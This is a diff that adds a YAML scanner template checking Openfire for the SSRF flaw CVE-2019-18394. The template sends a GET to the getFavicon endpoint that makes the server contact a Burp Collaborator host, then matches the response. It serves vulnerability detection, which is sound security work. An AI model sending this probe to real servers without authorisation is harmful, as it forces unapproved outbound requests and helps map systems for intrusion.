@@ -1,0 +1,22 @@
+id: openfire-ssrf
+info:
+  name: Openfire SSRF (CVE-2019-18394)
+  risk: Medium
+
+params:
+  - root: "{{.BaseURL}}"
+  - dest: "vvu8gyyr70izifx81a5iuc4gj7pzdo.burpcollaborator.net"
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/getFavicon?host={{.dest}}
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && RegexSearch("body", "(?m)\\<html\\>\\<body\\>[a-z0-9]+")
+
+references:
+  - link: https://swarm.ptsecurity.com/openfire-admin-console/
